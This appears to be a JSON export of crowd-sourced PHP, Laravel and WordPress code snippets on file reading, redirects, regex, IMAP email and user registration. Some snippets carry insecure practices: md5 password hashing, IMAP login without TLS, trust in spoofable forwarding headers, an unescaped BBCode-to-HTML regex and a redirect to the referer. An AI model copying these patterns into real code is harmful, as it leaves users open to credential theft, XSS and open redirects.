    "description": "<?php //Modify it for your project class Email_reader {  \t// imap server connection \tpublic $conn;  \t// inbox storage and inbox message count \tprivate $inbox; \tprivate $msg_cnt;  \t// email login credentials \tprivate $server = 'yourserver.com'; \tprivate $user   = 'email@yourserver.com'; \tprivate $pass   = 'yourpassword'; \tprivate $port   = 143; // adjust according to server settings  \t// connect to the server and get the inbox emails \tfunction __construct() { \t\t$this->connect(); \t\t$this->inbox(); \t}  \t// close the server connection \tfunction close() { \t\t$this->inbox = array(); \t\t$this->msg_cnt = 0;  \t\timap_close($this->conn); \t}  \t// open the server connection \t// the imap_open function parameters will need to be changed for the particular server \t// these are laid out to connect to a Dreamhost IMAP server \tfunction connect() { \t\t$this->conn = imap_open('{'.$this->server.'/notls}', $this->user, $this->pass); \t}  \t// move the message to a new folder \tfunction move($msg_index, $folder='INBOX.Processed') { \t\t// move on server \t\timap_mail_move($this->conn, $msg_index, $folder); \t\timap_expunge($this->conn);  \t\t// re-read the inbox \t\t$this->inbox(); \t}  \t// get a specific message (1 = first email, 2 = second email, etc.) \tfunction get($msg_index=NULL) { \t\tif (count($this->inbox) <= 0) { \t\t\treturn array(); \t\t} \t\telseif ( ! is_null($msg_index) && isset($this->inbox[$msg_index])) { \t\t\treturn $this->inbox[$msg_index]; \t\t}  \t\treturn $this->inbox[0]; \t}  \t// read the inbox \tfunction inbox() { \t\t$this->msg_cnt = imap_num_msg($this->conn);  \t\t$in = array(); \t\tfor($i = 1; $i <= $this->msg_cnt; $i++) { \t\t\t$in[] = array( \t\t\t\t'index'     => $i, \t\t\t\t'header'    => imap_headerinfo($this->conn, $i), \t\t\t\t'body'      => imap_body($this->conn, $i), \t\t\t\t'structure' => imap_fetchstructure($this->conn, $i) \t\t\t); \t\t}  \t\t$this->inbox = $in; \t}  }  ?> A fair amount of this is \n<?php     ini_set( 'display_errors', 1 );     error_reporting( E_ALL );     $from = \"test@hostinger-tutorials.com\";     $to = \"test@hostinger.com\";     $subject = \"Checking PHP mail\";     $message = \"PHP mail works just fine\";     $headers = \"From:\" . $from;     if(mail($to,$subject,$message, $headers)) { \t\techo \"The email message was sent.\";     } else {     \techo \"The email message was not sent.\";     }     ?>\n//docs https://www.php.net/manual/en/book.imap.php  https://garrettstjohn.com/articles/reading-email-php/\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4501,
    "keyword": null,
    "link": null,
    "title": " read csv php",
    "description": " <?php $row = 1; if (($handle = fopen(\"test.csv\", \"r\")) !== FALSE) {     while (($data = fgetcsv($handle, 1000, \",\")) !== FALSE) {         $num = count($data);         echo \"<p> $num fields in line $row: <br /></p>\\n\";         $row++;         for ($c=0; $c < $num; $c++) {             echo $data[$c] . \"<br />\\n\";         }     }     fclose($handle); } ?>  \n    $csvFile = file('../somefile.csv');     $data = [];     foreach ($csvFile as $line) {         $data[] = str_getcsv($line);     }\n<?php ini_set('auto_detect_line_endings',TRUE); $handle = fopen('/path/to/file','r'); while ( ($data = fgetcsv($handle) ) !== FALSE ) {   //process the array in $data   var_dump($data); } ini_set('auto_detect_line_endings',FALSE);\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4502,
    "keyword": null,
    "link": null,
    "title": " read file data using php",
    "description": "/* In php to read file first you have to use 'fopen' method to open the file after that you perform different operation on it. Like Reading file, Writing file etc.    TO read file data we have to use 'fread' method. */  <?php $myfile = fopen(\"read_text_file.txt\", \"r\") or die(\"Unable to open file!\"); echo fread($myfile,filesize(\"read_text_file.txt\")); fclose($myfile); ?>    /* I hope it will help you. Namaste Stay Home Stay Safe */\n<?php  $fh = fopen('filename.txt','r'); while ($line = fgets($fh)) {   // <... Do your work with the line ...>   // echo($line); } fclose($fh); ?>\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4503,
    "keyword": null,
    "link": null,
    "title": " read file using php",
    "description": "/* In php to read file first you have to use 'fopen' method to open the file after that you perform different operation on it. Like Reading file, Writing file etc.    TO read file data we have to use 'fread' method. */  <?php $myfile = fopen(\"read_text_file.txt\", \"r\") or die(\"Unable to open file!\"); echo fread($myfile,filesize(\"read_text_file.txt\")); fclose($myfile); ?>    /* I hope it will help you. Namaste Stay Home Stay Safe */\n<?php   echo file_get_contents(\"text.txt\"); ?>\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4504,
    "keyword": null,
    "link": null,
    "title": " read global laravel request()",
    "description": "request()->field_name\n",
    "reg_date": "2021-10-12T10:19:53.000Z"
  },
  {
    "id": 4505,
    "keyword": null,
    "link": null,
    "title": " read json file data using php",
    "description": "$filedata = file_get_contents('filename.json'); $details = json_decode($filedata); print_r($details);\n// Get the contents of the JSON file  $strJsonFileContents = file_get_contents(\"css-color-names.json\"); var_dump($strJsonFileContents); // show contentsCopy\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4506,
    "keyword": null,
    "link": null,
    "title": " read key value json php",
    "description": "// json object.     $contents = '{\"firstName\":\"John\", \"lastName\":\"Doe\"}';      // Option 1: through the use of an array.     $jsonArray = json_decode($contents,true);      $key = \"firstName\";      $firstName = $jsonArray[$key];       // Option 2: through the use of an object.     $jsonObj = json_decode($contents);      $firstName = $jsonObj->$key; \n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4507,
    "keyword": null,
    "link": null,
    "title": " read line by line php",
    "description": "$handle = fopen(\"inputfile.txt\", \"r\"); if ($handle) {     while (($line = fgets($handle)) !== false) {         // process the line read.     }      fclose($handle); } else {     // error opening the file. } \n<?php \t \t$file = new SplFileObject(\"file.txt\");  \twhile(!$file->eof()) \t  { \t\techo $file->fgets().\"<br/>\"; \t  }  \t$file = null;  ?>\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4508,
    "keyword": null,
    "link": null,
    "title": " real time ip in php",
    "description": "<?PHP  function getUserIP() {     // Get real visitor IP behind CloudFlare network     if (isset($_SERVER[\"HTTP_CF_CONNECTING_IP\"])) {               $_SERVER['REMOTE_ADDR'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];               $_SERVER['HTTP_CLIENT_IP'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];     }     $client  = @$_SERVER['HTTP_CLIENT_IP'];     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];     $remote  = $_SERVER['REMOTE_ADDR'];      if(filter_var($client, FILTER_VALIDATE_IP))     {         $ip = $client;     }     elseif(filter_var($forward, FILTER_VALIDATE_IP))     {         $ip = $forward;     }     else     {         $ip = $remote;     }      return $ip; }   $user_ip = getUserIP();  echo $user_ip; // Output IP address [Ex: 177.87.193.134]   ?>\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4509,
    "keyword": null,
    "link": null,
    "title": " recent post query wordpress",
    "description": " <?php              $recent_args = array(                 'post_type' => 'post type name',                 'posts_per_page' => 4,                 'orderby'        => 'date',                 'order'          => 'DESC'             );                   $recent_posts = new WP_Query( $recent_args );                          if( $recent_posts->have_posts() ) {         \t    while( $recent_posts->have_posts() ) : $recent_posts->the_post();                                   the_title();                                  endwhile;                  \t\t}      \t\telse {     \t    \techo \"There is no posts\";     \t    }          \t    wp_reset_postdata();     ?>\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4510,
    "keyword": null,
    "link": null,
    "title": " recognize persian or english word php",
    "description": "  // تشخیص کلمه فارسی و انگلیسی      public function isEnglish($str): bool     {         return strlen($str) == mb_strlen($str, 'utf-8');     }      public function webStandIsRTL(string $string): bool     {         if (preg_match('/^[^\\x{600}-\\x{6FF}]+$/u', str_replace(\"\\\\\\\\\", \"\", $string))) {             return false;         }         return true;     }\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4511,
    "keyword": null,
    "link": null,
    "title": " redirect 301 wordpress",
    "description": "add_action( 'template_redirect', 'redirect_to_other_page' ); function redirect_to_other_page() {     if ( is_page( 143 ) ) { \t         wp_redirect( '\"'.home_url().'/services/messenger/\"', 301 );       ///wp_redirect( 'example.com/page', 301 );      exit;     } }\n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4512,
    "keyword": null,
    "link": null,
    "title": " redirect 404 in laravel",
    "description": " return abort(404, 'Page not found.'); return abort(403, 'Unauthorized action.'); \"create a resources/views/errors/404.blade.php\"\n/**  * Render an exception into an HTTP response.  *  * @param  \\Illuminate\\Http\\Request  $request  * @param  \\Exception  $exception  * @return \\Illuminate\\Http\\Response  */ public function render($request, Exception $exception) {     if ($this->isHttpException($exception)) {         if ($exception->getStatusCode() == 404) {             return response()->view('errors.' . '404', [], 404);         }     }       return parent::render($request, $exception); } \n",
    "reg_date": "2021-10-12T10:19:54.000Z"
  },
  {
    "id": 4513,
    "keyword": null,
    "link": null,
    "title": " redirect after login laravel",
    "description": "class RegisterController extends Controller {     protected $redirectTo = '/home';      protected function redirectTo()     {         if (auth()->user()->role_id == 1) {             return '/admin';         }         return '/home';     }  } \nprotected function authenticated(Request $request, $user) { \t if ($user->role_id == 1) { \t \treturn redirect('/admin'); \t } else if ($user->role_id == 2) { \t \treturn redirect('/author'); \t } else { \t \treturn redirect('/blog'); \t } }\nnamespace App\\Http\\Controllers\\Auth;  use App\\Http\\Controllers\\Controller;  use Illuminate\\Foundation\\Auth\\AuthenticatesUsers;  use Illuminate\\Http\\Request;  class LoginController extends Controller { /* |-------------------------------------------------------------------------- | Login Controller |-------------------------------------------------------------------------- | | This controller handles authenticating users for the application and | redirecting them to your home screen. The controller uses a trait | to conveniently provide its functionality to your applications. | */  use AuthenticatesUsers;   protected function authenticated(Request $request, $user) { if ( $user->isAdmin() ) {// do your magic here     return redirect()->route('dashboard'); }   return redirect('/home'); } /**  * Where to redirect users after login.  *  * @var string  */ //protected $redirectTo = '/admin';  /**  * Create a new controller instance.  *  * @return void  */ public function __construct() {     $this->middleware('guest', ['except' => 'logout']); } }\n$this->redirectTo = route('dashboard');\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4514,
    "keyword": null,
    "link": null,
    "title": " redirect back in codeigniter",
    "description": "//You can use redirect in codeigniter by loading helper 'url' $this->load->helper('url');  //The redirects functions accepts two parameters to execute the function first is 'Location Url' and second parameter allows the developer to use different HTTP commands to perform the redirect \"location\" or \"refresh\". if (!$user_logged_in) {   redirect('/account/login', 'refresh'); }\nThis should help : http://www.codeigniter.com/user_guide/libraries/user_agent.html  $this->load->library('user_agent'); if ($this->agent->is_referral()){     echo $this->agent->referrer(); }  or straight PHP:  redirect($_SERVER['HTTP_REFERER']);\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4515,
    "keyword": null,
    "link": null,
    "title": " redirect from controller in laravel",
    "description": "return redirect()->route('login');\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4516,
    "keyword": null,
    "link": null,
    "title": " redirect from index.php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nRewriteCond %{REQUEST_URI} /index.php RewriteRule ^(.*)$ http://site.ru/ [R=301,L] \n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4517,
    "keyword": null,
    "link": null,
    "title": " redirect http to https htaccess",
    "description": "RewriteEngine On RewriteBase / RewriteCond %{HTTPS} !=on RewriteCond %{HTTP_HOST} ^yourdomain\\.com [OR] RewriteCond %{HTTP_HOST} ^www\\.yourdomain\\.com RewriteRule .* https://yourdomain.com%{REQUEST_URI} [R=301,L]\n<IfModule mod_rewrite.c>     RewriteEngine On     RewriteCond %{HTTPS} off     RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R,L] </IfModule>\n#htaccess  RewriteEngine On RewriteCond %{HTTPS} !=on RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301,NE]\nRewriteEngine On RewriteCond %{HTTPS} on RewriteRule (.*) http://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]\n<IfModule mod_rewrite.c> .... .... # Redirect To HTTPS RewriteCond %{HTTPS} off [OR] RewriteCond %{HTTP_HOST} ^www\\. [NC] RewriteRule ^ https://example.com%{REQUEST_URI} [L,NE,R=301] ... ... </IfModule>\nRewriteEngine On  RewriteCond %{HTTPS} !on  RewriteCond %{REQUEST_URI} !^/[0-9]+\\..+\\.cpaneldcv$  RewriteCond %{REQUEST_URI} !^/\\.well-known/pki-validation/[A-F0-9]{32}\\.txt(?:\\ Comodo\\ DCV)?$  RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4518,
    "keyword": null,
    "link": null,
    "title": " redirect http to https htaccess laravel 8",
    "description": "<IfModule mod_rewrite.c>     RewriteEngine On           RewriteCond %{HTTPS} !=on       RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]   RewriteRule ^(.*)$ public/ [L] </IfModule>\n<Files .env> Order allow,deny Deny from all </Files>  <Files composer.json> Order allow,deny Deny from all </Files>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  RewriteEngine On  # Handle Authorization Header RewriteCond %{HTTP:Authorization} . RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]  # Redirect Trailing Slashes If Not A Folder... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} (.+)/$ RewriteRule ^ %1 [L,R=301]  # Send Requests To Front Controller... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L] </IfModule>   <IfModule mod_rewrite.c> RewriteEngine On         RewriteCond %{HTTPS} !=on     RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301] RewriteRule ^(.*)$ public/ [L] </IfModule>\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4519,
    "keyword": null,
    "link": null,
    "title": " redirect http to https in laravel",
    "description": "<IfModule mod_rewrite.c>     RewriteEngine On           RewriteCond %{HTTPS} !=on       RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]   RewriteRule ^(.*)$ public/ [L] </IfModule>\n<Files .env> Order allow,deny Deny from all </Files>  <Files composer.json> Order allow,deny Deny from all </Files>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  <IfModule mod_rewrite.c> <IfModule mod_negotiation.c> Options -MultiViews -Indexes </IfModule>  RewriteEngine On  # Handle Authorization Header RewriteCond %{HTTP:Authorization} . RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]  # Redirect Trailing Slashes If Not A Folder... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_URI} (.+)/$ RewriteRule ^ %1 [L,R=301]  # Send Requests To Front Controller... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L] </IfModule>   <IfModule mod_rewrite.c> RewriteEngine On         RewriteCond %{HTTPS} !=on     RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301] RewriteRule ^(.*)$ public/ [L] </IfModule>\nRewriteEngine On  RewriteCond %{SERVER_PORT} 80  RewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4520,
    "keyword": null,
    "link": null,
    "title": " redirect in codeigniter",
    "description": "//You can use redirect in codeigniter by loading helper 'url' $this->load->helper('url');  //The redirects functions accepts two parameters to execute the function first is 'Location Url' and second parameter allows the developer to use different HTTP commands to perform the redirect \"location\" or \"refresh\". if (!$user_logged_in) {   redirect('/account/login', 'refresh'); }\n$this->load->helper('url'); redirect('/account/login', 'refresh');\nreturn redirect()->to(site_url()); \n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4521,
    "keyword": null,
    "link": null,
    "title": " redirect in php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header(\"Location: (redirect url)\"); ?>\n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\nheader(\"location: THE LOCATION\"); //\"THE LOCATION\", put in a URL or directory to redirect to. For example, header(\"location: https://google.com/\"); or header(\"location: ../../images/dog/\");\n",
    "reg_date": "2021-10-12T10:19:55.000Z"
  },
  {
    "id": 4522,
    "keyword": null,
    "link": null,
    "title": " redirect on validation error laravel to specific section laravel",
    "description": "$validator = Validator::make($request->all(), [   'name' => 'required', ]);  if ($validator->fails()) {   return redirect()->to(url()->previous() . '#section')->withErrors($validator)->withInput(); }\n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4523,
    "keyword": null,
    "link": null,
    "title": " redirect php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: pagetoredirectfor.php\"); exit();\n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4524,
    "keyword": null,
    "link": null,
    "title": " redirect to attempting url after login laravel",
    "description": "The intended method on the redirector will redirect the user to the URL they   were attempting to access before being intercepted by the authentication    middleware. A fallback URI may be given to this method in case the intended    destination is not available.    if (Auth::attempt($credentials)) {   // Authentication passed...   return redirect()->intended('dashboard'); }\n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4525,
    "keyword": null,
    "link": null,
    "title": " redirect to route laravel",
    "description": "Route::redirect('/here', '/there'); or return redirect(route('register'));\nreturn redirect()->route('login');\npath = \"{{route('dashboard')}}\"; window.location.href = path;\n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\nRoute::post('/user/profile', function () {     // Update the user's profile...      return redirect('/dashboard')->with('status', 'Profile updated!'); });\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', [$user]);\n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4526,
    "keyword": null,
    "link": null,
    "title": " redirect to site php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \nheader(\"Location: /\"); exit();\n//Write this in the Controller when working on Laravel.  header('Location: http://www.example.com/'); exit; \n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4527,
    "keyword": null,
    "link": null,
    "title": " redirect to url with post data laravel",
    "description": "return redirect()->route('home');\n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4528,
    "keyword": null,
    "link": null,
    "title": " redirect wordpress",
    "description": "add_action( 'template_redirect', 'redirect_to_other_page' ); function redirect_to_other_page() {     if ( is_page( 143 ) ) { \t         wp_redirect( '\"'.home_url().'/services/messenger/\"', 301 );       ///wp_redirect( 'example.com/page', 301 );      exit;     } }\nwp_redirect( $url ); \n",
    "reg_date": "2021-10-12T10:19:56.000Z"
  },
  {
    "id": 4529,
    "keyword": null,
    "link": null,
    "title": " redrectnh to https n laravel",
    "description": "// app/Providers/AppServiceProvider.php URL::forceScheme('https'); \nRewriteEngine On  RewriteCond %{SERVER_PORT} 80  RewriteRule ^(.*)$ https://www.yourdomain.com/$1 [R,L]\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4530,
    "keyword": null,
    "link": null,
    "title": " reducing the length of paragraph in php",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\n$firstStringCharacter = substr(\"hello\", 0, 1);\n$newstring = substr($dynamicstring, -7);\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4531,
    "keyword": null,
    "link": null,
    "title": " refresh a specific migration laravel",
    "description": "php artisan migrate --path=/database/migrations/selected/ \n* To run a specific migration  php artisan migrate:refresh --path=/database/migrations/2019_03_23_165757_create_combined_1553343771_users_table.php    - Note: it will drop the table and create a new one.  \n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4532,
    "keyword": null,
    "link": null,
    "title": " refresh seeder laravel",
    "description": "php artisan migrate:refresh --seed\nDB::table('translations')->where('field', 'page_desc')->update(['field' => 'meta_desc']); \n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4533,
    "keyword": null,
    "link": null,
    "title": " refresh web route laravel",
    "description": "php artisan cache:clear  php artisan route:cache\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4534,
    "keyword": null,
    "link": null,
    "title": " regex for email php",
    "description": "<?php  $pattern = '/^(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){255,})(?!(?:(?:\\\\x22?\\\\x5C[\\\\x00-\\\\x7E]\\\\x22?)|(?:\\\\x22?[^\\\\x5C\\\\x22]\\\\x22?)){65,}@)(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22))(?:\\\\.(?:(?:[\\\\x21\\\\x23-\\\\x27\\\\x2A\\\\x2B\\\\x2D\\\\x2F-\\\\x39\\\\x3D\\\\x3F\\\\x5E-\\\\x7E]+)|(?:\\\\x22(?:[\\\\x01-\\\\x08\\\\x0B\\\\x0C\\\\x0E-\\\\x1F\\\\x21\\\\x23-\\\\x5B\\\\x5D-\\\\x7F]|(?:\\\\x5C[\\\\x00-\\\\x7F]))*\\\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\\\]))$/iD';  $emailaddress = 'test@gmail.com';  if (preg_match($pattern, $emailaddress) === 1) {     // emailaddress is valid }\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4535,
    "keyword": null,
    "link": null,
    "title": " regex get text between braces",
    "description": "$text = 'ignore everything except this {{ text1  }}'; preg_match('#\\{\\{(.*?)\\}\\}#', $text, $match); var_dump($match); \n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4536,
    "keyword": null,
    "link": null,
    "title": " regex on names",
    "description": "// this filter works for most of cases  /* use this regex */ preg_match(\"/^[a-z ,.'-]+$/i\", your_string);\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4537,
    "keyword": null,
    "link": null,
    "title": " regex php",
    "description": "<?php // First Verif your regex code with https://regex101.com/ $str = \"Visit W3Schools\"; $pattern = \"/w3schools/i\"; echo preg_match($pattern, $str); // Outputs 1  // test email with REGEX if (!preg_match(\"/[-0-9a-zA-Z.+_]+@[-0-9a-zA-Z.+_]+.[a-zA-Z]{2,4}/\", $emailAddress)){     //Email address is invalid. }  // use filter var to valide Email if(filter_var($emailAddress, FILTER_VALIDATE_EMAIL))  {      //The email address is valid. } else{      //The email address is invalid. }   ?> \n<?php //Syntex : int preg_match( $pattern, $input, $matches, $flags, $offset)    // Declare a variable and initialize it  $str = \"Check For Testing.\";     // case-Insensitive search for the word \"Check\"  if (preg_match(\"/\\bCheck\\b/i\", $str, $match))       echo \"Matched!\";  else     echo \"not matched\";        // Output : Matched ?>\nif (preg_match(\"/\\bweb\\b/i\", \"PHP is the web scripting language of choice.\")) {     echo \"A match was found.\"; } else {     echo \"A match was not found.\"; }\nif(!preg_match('/^\\[a-zA-Z]+$/',$input)) {    // String contains not allowed characters ... }\n/\\b(stackoverflow)\\b/\n ive never used regex expressions till now and had loads of difficulty trying to convert a [url]link here[/url] into an href for use with posting messages on a forum, heres what i manage to come up with:  $patterns = array(             \"/\\[link\\](.*?)\\[\\/link\\]/\",             \"/\\[url\\](.*?)\\[\\/url\\]/\",             \"/\\[img\\](.*?)\\[\\/img\\]/\",             \"/\\[b\\](.*?)\\[\\/b\\]/\",             \"/\\[u\\](.*?)\\[\\/u\\]/\",             \"/\\[i\\](.*?)\\[\\/i\\]/\"         );         $replacements = array(             \"<a href=\\\"\\\\1\\\">\\\\1</a>\",             \"<a href=\\\"\\\\1\\\">\\\\1</a>\",             \"<img src=\\\"\\\\1\\\">\",             \"<b>\\\\1</b>\",             \"<u>\\\\1</u>\",             \"<i>\\\\1</i>\"                      );         $newText = preg_replace($patterns,$replacements, $text);  at first it would collect ALL the tags into one link/bold/whatever, until i added the \"?\" i still dont fully understand it... but it works :) \n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4538,
    "keyword": null,
    "link": null,
    "title": " regex to check date format php",
    "description": "if (preg_match(\"/\\d{4}\\-\\d{2}-\\d{2}/\", $date)) {     echo 'true'; } else {     echo 'false'; }\n",
    "reg_date": "2021-10-12T10:19:57.000Z"
  },
  {
    "id": 4539,
    "keyword": null,
    "link": null,
    "title": " registation form php",
    "description": "<?php session_start();  // initializing variables $username = \"\"; $email    = \"\"; $errors = array();   // connect to the database $db = mysqli_connect('localhost', 'root', '', 'registration');  // REGISTER USER if (isset($_POST['reg_user'])) {   // receive all input values from the form   $username = mysqli_real_escape_string($db, $_POST['username']);   $email = mysqli_real_escape_string($db, $_POST['email']);   $password_1 = mysqli_real_escape_string($db, $_POST['password_1']);   $password_2 = mysqli_real_escape_string($db, $_POST['password_2']);    // form validation: ensure that the form is correctly filled ...   // by adding (array_push()) corresponding error unto $errors array   if (empty($username)) { array_push($errors, \"Username is required\"); }   if (empty($email)) { array_push($errors, \"Email is required\"); }   if (empty($password_1)) { array_push($errors, \"Password is required\"); }   if ($password_1 != $password_2) { \tarray_push($errors, \"The two passwords do not match\");   }    // first check the database to make sure    // a user does not already exist with the same username and/or email   $user_check_query = \"SELECT * FROM users WHERE username='$username' OR email='$email' LIMIT 1\";   $result = mysqli_query($db, $user_check_query);   $user = mysqli_fetch_assoc($result);      if ($user) { // if user exists     if ($user['username'] === $username) {       array_push($errors, \"Username already exists\");     }      if ($user['email'] === $email) {       array_push($errors, \"email already exists\");     }   }    // Finally, register user if there are no errors in the form   if (count($errors) == 0) {   \t$password = md5($password_1);//encrypt the password before saving in the database    \t$query = \"INSERT INTO users (username, email, password)    \t\t\t  VALUES('$username', '$email', '$password')\";   \tmysqli_query($db, $query);   \t$_SESSION['username'] = $username;   \t$_SESSION['success'] = \"You are now logged in\";   \theader('location: index.php');   } }  // ...  \n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4540,
    "keyword": null,
    "link": null,
    "title": " register nav menu example",
    "description": "<?php add_action( 'after_setup_theme', 'register_my_menu' ); function register_my_menu() {   register_nav_menu( 'primary', __( 'Primary Menu', 'theme-slug' ) ); } ?>\n",
    "reg_date": "2021-10-12T10:19:58.000Z"
  },
  {
    "id": 4541,
    "keyword": null,
    "link": null,
    "title": " register sidebar wordpress",
